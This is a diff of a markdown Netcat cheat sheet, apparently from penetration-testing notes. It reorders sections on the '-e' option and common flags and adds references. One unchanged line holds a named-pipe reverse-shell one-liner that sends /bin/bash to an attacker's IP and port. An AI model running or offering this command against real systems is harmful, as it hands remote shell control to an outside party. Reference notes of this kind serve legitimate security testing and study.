@@ -1,5 +1,20 @@
 # Netcat Cheatsheet
 
+\*Hobbit\*: *"a simple utility which reads and writes data across network connections, using TCP or UDP protocols."*
+
+[sourceforge.page](https://nc110.sourceforge.io/)
+
+## -e
+Kali linux has nc compiled with the flag: `-DGAPING_SECURITY_HOLE` with enabled -e option **MOST** modern Linux/BSD system **DON'T SUPPORT** -e. This option can redirect the input, output, and error messages of an executable to a TCP/UDP port rather than the default console.
+
+## Flags
+```bash
+-n	skip DNS name resolution
+-v	verbosity
+-l	listener
+-p	port
+```
+
 ## Useful commands and context
 
 Interact with application:
@@ -37,11 +52,7 @@ mknod backpipe p; nc $attacker_ip $port 0<backpipe | /bin/bash 1>backpipe
 ```
 
 
-## -e
-Kali linux has nc compiled with the flag: `-DGAPING_SECURITY_HOLE` with enabled -e option **MOST** modern Linux/BSD system **DON'T SUPPORT** -e. This option can redirect the input, output, and error messages of an executable to a TCP/UDP port rather than the default console.
+## References
 
-## Flags
--n	skip DNS name resolution
--v	verbosity
--l	listener
--p	port
+[sourceforge.page](https://nc110.sourceforge.io/)
+[Ed Skoudis](https://twitter.com/edskoudis)
